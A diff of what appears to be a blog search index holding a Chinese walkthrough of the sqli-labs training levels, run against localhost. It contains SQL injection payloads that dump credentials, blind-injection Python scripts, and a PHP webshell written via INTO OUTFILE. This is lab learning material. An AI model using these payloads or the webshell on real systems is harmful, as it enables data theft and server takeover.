-<p><strong>最后一句话总结下：floor()报错注入的原因是group by在向临时表插入数据时，由于rand()多次计算导致插入临时表时主键重复，从而报错，又因为报错前concat()中的SQL语句或函数被执行，所以该语句报错且被抛出的主键是SQL语句或函数执行后的结果。</strong></p>
-<h3 id="xpath语法错误报错注入"><a class="header-anchor" href="#xpath语法错误报错注入">¶</a>xpath语法错误报错注入</h3>
-<p>从mysql5.1.5开始提供两个XML查询和修改的函数，<strong>extractvalue和updatexml</strong>。extractvalue负责在xml文档中按照xpath语法查询节点内容，updatexml则负责修改查询到的内容。</p>
-<h4 id="updatexml（）函数"><a class="header-anchor" href="#updatexml（）函数">¶</a>updatexml（）函数</h4>
-<ul>
-<li>updatexml（）是一个使用不同的xml标记匹配和替换xml块的函数。</li>
-<li>作用：改变文档中符合条件的节点的值</li>
-<li>语法： updatexml（XML_document，XPath_string，new_value） 第一个参数：是string格式，为XML文档对象的名称，文中为Doc 第二个参数：代表路径，Xpath格式的字符串例如//title【@lang】 第三个参数：string格式，替换查找到的符合条件的数据</li>
-<li>updatexml使用时，当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）</li>
-<li>例如： select * from test where ide = 1 and (updatexml(1,0x7e,3)); 由于0x7e是~，不属于xpath语法格式，因此报出xpath语法错误。</li>
-</ul>
-<p>第一个参数表示目标 xml 文档，第二个参数表示 xml 路径。<br>
-我们主要利用在第二个参数的位置，当正常查询时，第二个参数应该是 /xxx/xxx/xxx/… 这种形式。<br>
-如果写成其他形式就会报错。<br>
-当正常查询时，即使查询不到也不会报错。<br>
-<img src="http://www.aiyuanzhen.com/usr/uploads/2019/05/2621929796.png" alt="7.png">当我们尝试报错注入时：测试代码：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select pname,page from person where pwd &#x3D; &#39;111&#39; and (extractvalue(&#39;hhhhhhh&#39;,concat(0x7e,(select database()))));</span><br></pre></td></tr></table></figure>
-<p><img src="http://www.aiyuanzhen.com/usr/uploads/2019/05/2034180883.png" alt="8.png"></p>
-<blockquote>
-<p>Tips: extractvalue () 能查询字符串的最大长度为 32，就是说如果我们想要的结果超过 32，就需要用 substring () 函数截取。</p>
-</blockquote>
-<p>测试代码：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select pname,page from person where pwd &#x3D; &#39;111&#39; and (extractvalue(&#39;hhhhhhh&#39;,concat(0x7e,substring(hex((select database())),1,20))));</span><br></pre></td></tr></table></figure>
-<p><img src="http://www.aiyuanzhen.com/usr/uploads/2019/05/1631177789.png" alt="9.png"><img src="http://www.aiyuanzhen.com/usr/uploads/2019/05/2352499770.png" alt="10.png"></p>
-<blockquote>
-<p>总结：利用 xpath 字符串格式报错进行注入，要注意查询字符长度限制。</p>
-</blockquote>
-<h4 id="extractvalue（）函数"><a class="header-anchor" href="#extractvalue（）函数">¶</a>extractvalue（）函数</h4>
-<ul>
-<li>此函数从目标XML中返回包含所查询值的字符串 语法：extractvalue（XML_document，xpath_string） 第一个参数：string格式，为XML文档对象的名称 第二个参数：xpath_string（xpath格式的字符串） select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</li>
-<li>extractvalue使用时当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）</li>
-<li>select user,password from users where user_id=1 and (extractvalue(1,0x7e));</li>
-<li>由于0x7e就是~不属于xpath语法格式，因此报出xpath语法错误。</li>
-</ul>
-<p>updatexml () 报错与 extractvalue () 报错类似，都是由于 xpath 格式错误报错，同样能查询字符串的最大长度为 32，同样在第二个参数出插入我们需要的语句代码。<br>
-测试代码：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select pname,page from person where pwd &#x3D; &#39;111&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1);</span><br></pre></td></tr></table></figure>
-<p><img src="http://www.aiyuanzhen.com/usr/uploads/2019/05/923618974.png" alt="11.png"></p>
-<blockquote>
-<p>总结：利用 xpath 字符串格式报错进行注入，要注意查询字符长度限制。</p>
-</blockquote>
-<p><strong>利用extractvalue()报错和updatexml()报错均只能查询32及以内长度的字符，当超出32时，我们要结合mid()和substr()来进行注入。</strong></p>
-<h2 id="Less-6"><a class="header-anchor" href="#Less-6">¶</a>Less-6</h2>
-<p>学会一项新技能，利用burpsuit进行fuzz，发现需要闭合 “ ，后面的playload和Less-5一样了。</p>
-<p>我用的是burp自带的fuzz字典</p>
-<p><a href="https://imgchr.com/i/BoORHg"><img src="https://s1.ax1x.com/2020/11/08/BoORHg.png" alt="BoORHg.png"></a></p>
-<p>可以看见 “ 报错了</p>
-<p><a href="https://imgchr.com/i/BoO44s"><img src="https://s1.ax1x.com/2020/11/08/BoO44s.png" alt="BoO44s.png"></a></p>
-<h2 id="Less-7"><a class="header-anchor" href="#Less-7">¶</a>Less-7</h2>
-<p>这题是有关文件读取与注入的。这种题目一般有两个难点。<br>
-1.要有读取文件的权限<br>
-2.要知道绝对物理路径<br>
-对于这道题，我们先经过fuzz确定需要闭合’))。又由于我们是本机操作所以默认知道了绝对路径。因此上传一句话木马。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-7&#x2F;?id&#x3D;1&#39;))UNION SELECT 1,2,&#39;&lt;?php @eval($_post[“t”])?&gt;&#39; into outfile &quot;C:\\vip\\sqli-labs-master\\Less-7\\c.php&quot;--+</span><br></pre></td></tr></table></figure>
-<p>之后使用中国菜刀连接即可getshell。<br>
-注意:地址中的每个\都要在前面加上另外一个\来转义</p>
-<h2 id="Less-8"><a class="header-anchor" href="#Less-8">¶</a>Less-8</h2>
-<p>经过简单测试，这道题我们需要闭合’。和Less-5一样没有显示位。但是和Less-5的区别在于过滤了报错语句，所以我们不能使用报错注入，只能使用布尔盲注和延时注入。在这里我们使用布尔盲注。我这里使用了一个半自动的布尔盲注脚本。</p>
-<p>布尔盲注详细请看大佬: <a href="https://www.cnblogs.com/zane-s/articles/12371820.html#CRWcQXhE">布尔盲注</a></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and ord(substr(playload,&#123;&#125;,1))=&#123;&#125;--+&quot;</span></span><br><span class="line">result =<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">23</span>,<span class="number">127</span>):</span><br><span class="line">		payload = url.<span class="built_in">format</span>(i,j)</span><br><span class="line">		r = requests.get(payload)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">&quot;are&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">			result += <span class="built_in">chr</span>(j)</span><br><span class="line">			<span class="built_in">print</span> (result)</span><br><span class="line">			<span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
-<p>playload 那里填入我们的注入的语句</p>
-<h2 id="Less-9"><a class="header-anchor" href="#Less-9">¶</a>Less-9</h2>
-<p>这道题考的是延时注入。经测试，无论输入什么都是返回You are in…所以我们不能根据页面的返回来判断是否执行语句，也就是不能执行布尔注入。</p>
-<p>时间盲注参考大佬:<a href="https://my.oschina.net/u/4368807/blog/4497390">时间盲注</a></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and sleep(5)--+</span><br></pre></td></tr></table></figure>
-<p>我们先进行此语句，发现页面没有立刻返回，说明语句已经被执行。说明我们闭合正确了。我继续用了一个半自动的脚本。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and if(ord(substr(database(),&#123;&#125;,1))=&#123;&#125;,sleep(5),1)--+&quot;</span></span><br><span class="line">result  = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">23</span>,<span class="number">127</span>):</span><br><span class="line">		payload = url.<span class="built_in">format</span>(i,j)</span><br><span class="line">		time1 = time.time()</span><br><span class="line">		r = requests.get(payload)</span><br><span class="line">		time2 = time.time()</span><br><span class="line">		time3 = time2 - time1</span><br><span class="line">		<span class="keyword">if</span> time3 &gt; <span class="number">4</span>:</span><br><span class="line">			result += <span class="built_in">chr</span>(j)</span><br><span class="line">			<span class="built_in">print</span> (result)</span><br><span class="line">			<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
-<h2 id="Less-10"><a class="header-anchor" href="#Less-10">¶</a>Less-10</h2>
-<p>首先测试闭合。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-10&#x2F;?id&#x3D;1&#39; and sleep(5)--+</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-10&#x2F;?id&#x3D;1&#39;) and sleep(5)--+</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-10&#x2F;?id&#x3D;1&#39;)) and sleep(5)--+</span><br></pre></td></tr></table></figure>
-<p>测试这上面三个发现都立刻加载出页面，说明语句没有被执行。再测试双引号发现可以被执行。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-10&#x2F;?id&#x3D;1&quot; and sleep(5)--+</span><br></pre></td></tr></table></figure>
-<h2 id="Less-11"><a class="header-anchor" href="#Less-11">¶</a>Less-11</h2>
-<p>从这关开始就进入post注入的范围了。但是其实post注入和get注入差别不大。<br>
-我们先对username传入admin’# ,密码随便输。可以发现我们登陆成功，显示出了admin账号的密码。接下来的注入过程类似Less-1。<br>
-先用order by判断出有两个字段。再依次对username进行传参。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username&#x3D;admin&#39; union select 1,database()#</span><br><span class="line">username&#x3D;1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()#</span><br><span class="line">username&#x3D;1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39;#</span><br><span class="line">username&#x3D;1&#39; union select 1,group_concat(username,0x3a,password,0x3c2f62723e) from security.users#</span><br></pre></td></tr></table></figure>
-<p>至于这个过程,password可以随便输入。因为当你传进去username的参数后，后台的sql语句变成这样：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT username, password FROM users WHERE username&#x3D;&#39;1&#39; union select 1,group_concat(username,0x3a,password,0x3c2f62723e) from security.users#&#39; and password&#x3D;&#39;$passwd&#39; LIMIT 0,1</span><br></pre></td></tr></table></figure>
-<p>可以看出，password部分已经被我们注释掉了，从而达到了绕过的目的。</p>
-<h2 id="Less-12"><a class="header-anchor" href="#Less-12">¶</a>Less-12</h2>
-<p>这一关和Less-11几乎一样，只是闭合方式从’变成了”)，改变闭合方式后剩余步骤模仿Less-11就行。 这里解释一下一个问题，就是我们对username传入1’ or 1=1#后发现我们是以dumb账号登陆。这里是因为他在语句后面加了limit限制只允许输出一条数据的原因，而dumb账号在表中的优先级是最高的，所以优先输出dumb账户的数据。</p>
-<h2 id="Less-13"><a class="header-anchor" href="#Less-13">¶</a>Less-13</h2>
-<p>经测试，可用’)来进行闭合，但是闭合后发现没有显示位，测试了一下发现可以使用报错注入。这次我使用extractvalue()报错。<br>
-依次对username进行传参。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username:1&#39;) and extractvalue(1,concat(1,database()))#</span><br><span class="line">username:1&#39;) and extractvalue(1,concat(1,(select (table_name) from information_schema.tables where table_schema&#x3D;database() limit 0,1)))#</span><br><span class="line">username:1&#39;) and extractvalue(1,concat(1,(select (column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 0,1)))#</span><br><span class="line">username:1&#39;) and extractvalue(1,concat(1,(select concat(username,0x3a,password) from security.users limit 1,1)))#</span><br></pre></td></tr></table></figure>
-<h2 id="Less-14"><a class="header-anchor" href="#Less-14">¶</a>Less-14</h2>
-<p>这道题和上一道题基本一样，只是转换闭合方式为 “。之后步骤模仿Less-13即可</p>
-<h2 id="Less-15"><a class="header-anchor" href="#Less-15">¶</a>Less-15</h2>
-<p>页面有回显，但是无法使用报错注入。故使用布尔盲注。<br>
-这里继续用一个半自动的脚本来解决:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-15&#x2F;&quot;</span><br><span class="line">result &#x3D;&quot;&quot;</span><br><span class="line">for i in range(1,10):</span><br><span class="line">	for j in range(65,150):</span><br><span class="line">		payload1 &#x3D; &quot;admin&#39;^(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)^1#&quot;.format(i,j)</span><br><span class="line">		payload2 &#x3D; &quot;admin&#39;^(ascii(mid(database()from &#123;&#125;))&gt;&#123;&#125;)^1%23&quot;.format(i,j)</span><br><span class="line">		data &#x3D; &#123;&quot;uname&quot;:payload1,&quot;passwd&quot;:&quot;123&quot;&#125;</span><br><span class="line">		r &#x3D; requests.post(url,data&#x3D;data)</span><br><span class="line">		if &quot;slap.jpg&quot; in r.text:</span><br><span class="line">			result +&#x3D; chr(j)</span><br><span class="line">			print result</span><br><span class="line">			break</span><br></pre></td></tr></table></figure>
-<h2 id="Less-16"><a class="header-anchor" href="#Less-16">¶</a>Less-16</h2>
-<p>这道题和Less-15基本一样。只不过把闭合换成了”)而已，只需要更改脚本即可得出结果。</p>
-]]></content>
-      <categories>
-        <category>web技术学习</category>
-        <category>sql注入</category>
       </categories>
   </entry>
   <entry>
@@ -3698,6 +3553,201 @@ payload:</p>
       <categories>
         <category>刷题站</category>
         <category>ctfshow</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>sql-labs刷题记录</title>
+    <url>/2020/10/02/sqli%20labs%E5%88%B7%E9%A2%98%E6%89%8B%E5%86%8C/</url>
+    <content><![CDATA[<p>记录sql-labs学习</p>
+<a id="more"></a>
+<p><strong>先看一下IMformation_schema结构</strong></p>
+<p><a href="https://imgchr.com/i/B5PhcR"><img src="https://s1.ax1x.com/2020/11/07/B5PhcR.png" alt="B5PhcR.png"></a></p>
+<h2 id="Less-1（1-4联合注入）"><a class="header-anchor" href="#Less-1（1-4联合注入）">¶</a>Less-1（1-4联合注入）</h2>
+<p>小白可以先看这两篇文章</p>
+<p><a href="https://zhuanlan.zhihu.com/p/22397455">文章1</a> <a href="https://zhuanlan.zhihu.com/p/22397620">文章2</a></p>
+<p>我们先来判断注入类型。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and 1&#x3D;1 --+</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and 1&#x3D;2 --+</span><br></pre></td></tr></table></figure>
+<p>经这两者判断，第一种传入网站显示正常，第二种传入网站显示不正常。可以看出我们的语句已经被执行。因此说明是单引号类型注入。 先判断字段数。依次递增order by 后面的数值。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1&#39; order by 1 --+</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1&#39; order by 2 --+</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1&#39; order by 3 --+</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1&#39; order by 4 --+</span><br></pre></td></tr></table></figure>
+<p>发现3时不报错,而4时报错，所以字段数是3。<br>
+接下来用联合查询判断显示位。首先我们要让id变成一个不存在的值以便显示出来的值都是union语句执行的结果。在这里我们使用100。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;100&#39; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
+<p><a href="https://imgchr.com/i/B5kf3Q"><img src="images/B5kf3Q.png" alt="B5kf3Q.png"></a></p>
+<p>接下来就是常规操作</p>
+<p><code>爆库:http://127.0.0.1/sqli-labs-master/Less-1/?id=100' union select 1,2,database() --+</code></p>
+<p><code>爆表:http://127.0.0.1/sqli-labs-master/Less-1/?id=100' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</code></p>
+<p><code>爆字段:http://127.0.0.1/sqli-labs-master/Less-1/?id=100' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users' --+</code></p>
+<p><code>爆值:http://127.0.0.1/sqli-labs-master/Less-1/?id=100' union select 1,2,group_concat(username,0x3a,password,0x3c2f62723e) from security.users --+</code></p>
+<h2 id="Less-2"><a class="header-anchor" href="#Less-2">¶</a>Less-2</h2>
+<p>这道题和上面那道其实很类似。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1 and 1&#x3D;1 --+</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1 and 1&#x3D;2 --+</span><br></pre></td></tr></table></figure>
+<p>第一种传入网站显示正常，第二种传入网站显示不正常。可以看出我们的语句已经被执行。因此说明是数值类型注入。<br>
+之后的注入类型与Less-1雷同(仅需把单引号去掉而已)。不再赘述。</p>
+<h2 id="Less-3"><a class="header-anchor" href="#Less-3">¶</a>Less-3</h2>
+<p>我们先传入id=1’,可以得到这样的报错信息。</p>
+<p><a href="https://imgchr.com/i/B5eq1S"><img src="https://s1.ax1x.com/2020/11/07/B5eq1S.png" alt="B5eq1S.png"></a></p>
+<p>分析以下句子</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">COPY&#39;&#39;1&#39;&#39;) LIMIT 0,1&#39;</span><br></pre></td></tr></table></figure>
+<p>左右两边的单引号是代表是字符串，再分析下面句子</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;1&#39;&#39;)</span><br></pre></td></tr></table></figure>
+<p>1‘ 是我们传进去的，由报错信息可知，后台的sql语句应该带有括号，并且有<code>'</code>,即<code>('$id')</code></p>
+<p>由此看出，我们需要闭合’)</p>
+<h2 id="Less-4"><a class="header-anchor" href="#Less-4">¶</a>Less-4</h2>
+<p>老样子输入 ’ 看看是否有报错</p>
+<p>发现输入 “  会有报错，分析可得 我们需要闭合 ”）</p>
+<p><a href="https://imgchr.com/i/B5QPOS"><img src="https://s1.ax1x.com/2020/11/07/B5QPOS.png" alt="B5QPOS.png"></a></p>
+<h2 id="Less-5"><a class="header-anchor" href="#Less-5">¶</a>Less-5</h2>
+<p>这题不管我们怎么输入，只有两种回显状态，<strong>我们使用floor报错注入</strong></p>
+<p><a href="https://imgchr.com/i/Bofgn1"><img src="https://s1.ax1x.com/2020/11/08/Bofgn1.png" alt="Bofgn1.png"></a></p>
+<h3 id="playload"><a class="header-anchor" href="#playload">¶</a>playload:</h3>
+<p><code>爆库:http://127.0.0.1/sqli-labs-master/Less-5/?id=1' and (select 1 from (select count(*),concat((database()),floor (rand(0)*2))x from information_schema.tables group by x)a)--+</code></p>
+<p><code>爆表:http://127.0.0.1/sqli-labs-master/Less-5/?id=1' and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=database()),floor (rand(0)*2))x from information_schema.tables group by x)a)--+</code></p>
+<p><a href="https://imgchr.com/i/Bo5hNV"><img src="https://s1.ax1x.com/2020/11/08/Bo5hNV.png" alt="Bo5hNV.png"></a></p>
+<p>这里发现页面提示我输出信息超过一行，所以我们要采用limit语句来控制输出。</p>
+<p>根据limit不断递增即可得到全部值。</p>
+<p><code>爆字段:http://127.0.0.1/sqli-labs-master/Less-5/?id=1' and (select 1 from (select count(*),concat((select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database()limit 0,1 ),floor (rand(0)*2))x from information_schema.tables group by x)a)--+</code></p>
+<h3 id="floor报错注入"><a class="header-anchor" href="#floor报错注入">¶</a>floor报错注入</h3>
+<ul>
+<li>floor () 报错原理</li>
+</ul>
+<p>研究了一下午，总算是把这个原理搞懂了。<br>
+利用 floor () 函数使 SQL 语句报错，实际上是由 rand () ， count () ， group by 三个函数语句联合使用造成的。<br>
+首先，看一下语句中使用到的函数和子句：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. concat： 连接字符串功能</span><br><span class="line">2. floor： 取float的整数值(向下取整）</span><br><span class="line">3. rand： 取0~1之间的随机浮点值</span><br><span class="line">4. group by： 根据一个或多个列对结果集进行分组并有排序功能</span><br><span class="line">5. floor(rand(0)*2)： 随机产生0或1</span><br></pre></td></tr></table></figure>
+<p>刚才已经说了 利用 floor () 的报错注入实际上是由 rand () ， count () ， group by 三个函数语句联合使用造成的，想要搞清楚原理我们首先来分析单个，<br>
+从 group by 子句开始，<br>
+这里我建了一个 person 表测试：<br>
+<img src="http://www.aiyuanzhen.com/usr/uploads/2019/05/2915214011.png" alt="2.png">我们通过 page 年龄这个字段来对表中数据分组：<img src="http://www.aiyuanzhen.com/usr/uploads/2019/05/916623330.png" alt="3.png">可以看到我们出现了一个新的数据表，有 page 、 count (<em>) 这两个字段，count (</em>) 字段下表示每个年龄人的数量，可以联想到 group by 子句的执行流程，最初时，page-count (<em>) 这个数据表是空的，通过一行一行读原数据表中的 page 字段，如果读到的 page 在 page-count (</em>) 数据表中不存在，就将它插入，并且将对应的 count (<em>) 赋为 1，如果存在，就将其对应的 count (</em>) +1，直至扫完整个数据表。</p>
+<blockquote>
+<p>Tips：这里有一点需要注意， group by 后跟的字段名是作为虚拟表的主键，主键不能重复，这也是报错的关键点。</p>
+</blockquote>
+<p>报错的主要原因是虚拟表的主键重复，那我们来看一下是哪里，在什么情景下重复了。<br>
+这时候用到 rand () 函数了，继续来了解 rand () 函数的用法：</p>
+<ol>
+<li>生成 0~1 之间的随机浮点值</li>
+<li>可以给 rand () 传一个参数作为 rand () 的种子，然后 rand 函数会依据这个种子进行随机生成</li>
+</ol>
+<p>这里加上 floor () 函数的用法：</p>
+<ol>
+<li>floor： 取 float 的整数值 (向下取整）</li>
+</ol>
+<p>所以，floor (rand ()*2) 和 floor (rand (0)*2) 表示产生 0 或者 1。<br>
+我们来比较下它们的区别：<br>
+<img src="http://www.aiyuanzhen.com/usr/uploads/2019/05/1346366380.png" alt="4.png"><img src="http://www.aiyuanzhen.com/usr/uploads/2019/05/1683359691.png" alt="5.png">可以看得出来  **floor (rand (0)*2)**是有规律的 。</p>
+<p><strong>报错原因解析</strong></p>
+<p>通过 floor 报错的方法来爆数据的本质是 group by 语句的报错。group by 语句报错的原因</p>
+<p>是 floor(random(0)*2)的不确定性，即可能为 0 也可能为 1</p>
+<p>group by key 执行时循环读取数据的每一行，将结果保存于临时表中。读取每一行的 key 时，</p>
+<p>如果 key 存在于临时表中，则更新临时表中的数据（更新数据时，不再计算 rand 值）；如果</p>
+<p>该 key 不存在于临时表中，则在临时表中插入 key 所在行的数据。（插入数据时，会再计算</p>
+<p>rand 值）</p>
+<p>如果此时临时表只有 key 为 1 的行不存在 key 为 0 的行，那么数据库要将该条记录插入临</p>
+<p>时表，由于是随机数，插时又要计算一下随机值，此时 floor(random(0)*2)结果可能为 1，就</p>
+<p>会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值</p>
+<p>实际测试中发现，出现报错，至少要求数据记录为 3 行，记录数超过 3 行一定会报错，2 行</p>
+<p>时是不报错的。</p>
+<blockquote>
+<p>Tips: 综上所述，当数据表记录大于三时，使用 group by floor (rand (0)<em>2) 一定报错。</em></p>
+<p>*在测试过程中，发现 rand(14)*2只需要两条数据就能报错。但如果from的表中只有一条数据的话floor()报错注入就没法用了，毕竟是重复，只插入一条数据怎么主键重复，对吧。</p>
+</blockquote>
+<p><strong>最后一句话总结下：floor()报错注入的原因是group by在向临时表插入数据时，由于rand()多次计算导致插入临时表时主键重复，从而报错，又因为报错前concat()中的SQL语句或函数被执行，所以该语句报错且被抛出的主键是SQL语句或函数执行后的结果。</strong></p>
+<h3 id="xpath语法错误报错注入"><a class="header-anchor" href="#xpath语法错误报错注入">¶</a>xpath语法错误报错注入</h3>
+<p>从mysql5.1.5开始提供两个XML查询和修改的函数，<strong>extractvalue和updatexml</strong>。extractvalue负责在xml文档中按照xpath语法查询节点内容，updatexml则负责修改查询到的内容。</p>
+<h4 id="updatexml（）函数"><a class="header-anchor" href="#updatexml（）函数">¶</a>updatexml（）函数</h4>
+<ul>
+<li>updatexml（）是一个使用不同的xml标记匹配和替换xml块的函数。</li>
+<li>作用：改变文档中符合条件的节点的值</li>
+<li>语法： updatexml（XML_document，XPath_string，new_value） 第一个参数：是string格式，为XML文档对象的名称，文中为Doc 第二个参数：代表路径，Xpath格式的字符串例如//title【@lang】 第三个参数：string格式，替换查找到的符合条件的数据</li>
+<li>updatexml使用时，当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）</li>
+<li>例如： select * from test where ide = 1 and (updatexml(1,0x7e,3)); 由于0x7e是~，不属于xpath语法格式，因此报出xpath语法错误。</li>
+</ul>
+<p>第一个参数表示目标 xml 文档，第二个参数表示 xml 路径。<br>
+我们主要利用在第二个参数的位置，当正常查询时，第二个参数应该是 /xxx/xxx/xxx/… 这种形式。<br>
+如果写成其他形式就会报错。<br>
+当正常查询时，即使查询不到也不会报错。<br>
+<img src="http://www.aiyuanzhen.com/usr/uploads/2019/05/2621929796.png" alt="7.png">当我们尝试报错注入时：测试代码：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select pname,page from person where pwd &#x3D; &#39;111&#39; and (extractvalue(&#39;hhhhhhh&#39;,concat(0x7e,(select database()))));</span><br></pre></td></tr></table></figure>
+<p><img src="http://www.aiyuanzhen.com/usr/uploads/2019/05/2034180883.png" alt="8.png"></p>
+<blockquote>
+<p>Tips: extractvalue () 能查询字符串的最大长度为 32，就是说如果我们想要的结果超过 32，就需要用 substring () 函数截取。</p>
+</blockquote>
+<p>测试代码：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select pname,page from person where pwd &#x3D; &#39;111&#39; and (extractvalue(&#39;hhhhhhh&#39;,concat(0x7e,substring(hex((select database())),1,20))));</span><br></pre></td></tr></table></figure>
+<p><img src="http://www.aiyuanzhen.com/usr/uploads/2019/05/1631177789.png" alt="9.png"><img src="http://www.aiyuanzhen.com/usr/uploads/2019/05/2352499770.png" alt="10.png"></p>
+<blockquote>
+<p>总结：利用 xpath 字符串格式报错进行注入，要注意查询字符长度限制。</p>
+</blockquote>
+<h4 id="extractvalue（）函数"><a class="header-anchor" href="#extractvalue（）函数">¶</a>extractvalue（）函数</h4>
+<ul>
+<li>此函数从目标XML中返回包含所查询值的字符串 语法：extractvalue（XML_document，xpath_string） 第一个参数：string格式，为XML文档对象的名称 第二个参数：xpath_string（xpath格式的字符串） select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</li>
+<li>extractvalue使用时当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）</li>
+<li>select user,password from users where user_id=1 and (extractvalue(1,0x7e));</li>
+<li>由于0x7e就是~不属于xpath语法格式，因此报出xpath语法错误。</li>
+</ul>
+<p>updatexml () 报错与 extractvalue () 报错类似，都是由于 xpath 格式错误报错，同样能查询字符串的最大长度为 32，同样在第二个参数出插入我们需要的语句代码。<br>
+测试代码：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select pname,page from person where pwd &#x3D; &#39;111&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1);</span><br></pre></td></tr></table></figure>
+<p><img src="http://www.aiyuanzhen.com/usr/uploads/2019/05/923618974.png" alt="11.png"></p>
+<blockquote>
+<p>总结：利用 xpath 字符串格式报错进行注入，要注意查询字符长度限制。</p>
+</blockquote>
+<p><strong>利用extractvalue()报错和updatexml()报错均只能查询32及以内长度的字符，当超出32时，我们要结合mid()和substr()来进行注入。</strong></p>
+<h2 id="Less-6"><a class="header-anchor" href="#Less-6">¶</a>Less-6</h2>
+<p>学会一项新技能，利用burpsuit进行fuzz，发现需要闭合 “ ，后面的playload和Less-5一样了。</p>
+<p>我用的是burp自带的fuzz字典</p>
+<p><a href="https://imgchr.com/i/BoORHg"><img src="https://s1.ax1x.com/2020/11/08/BoORHg.png" alt="BoORHg.png"></a></p>
+<p>可以看见 “ 报错了</p>
